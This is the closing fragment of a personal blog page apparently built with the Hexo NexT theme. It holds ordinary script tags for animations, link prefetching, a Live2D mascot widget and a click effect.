  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
  <script src="//cdn.jsdelivr.net/npm/quicklink@1/dist/quicklink.umd.js"></script>
  <script>
      window.addEventListener('load', () => {
      quicklink({
        timeout : 3000,
        priority: true,
        ignores : [uri => uri.includes('#'),uri => uri === 'http://swanq.top/',]
      });
      });
  </script>

<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
<script type="text/javascript" src="/js/src/clicklove.js"></script>
</html>
